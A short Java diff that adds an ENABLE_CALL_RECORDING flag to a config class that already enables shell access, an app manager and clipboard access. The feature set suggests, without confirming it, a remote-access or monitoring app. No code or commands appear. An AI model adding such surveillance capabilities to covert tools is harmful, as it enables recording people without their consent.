@@ -22,4 +22,5 @@ public class Config {
     public static final boolean ENABLE_SHELL = true;
     public static final boolean ENABLE_APP_MANAGER = true;
     public static final boolean ENABLE_CLIPBOARD = true;
+    public static final boolean ENABLE_CALL_RECORDING = true;
 }
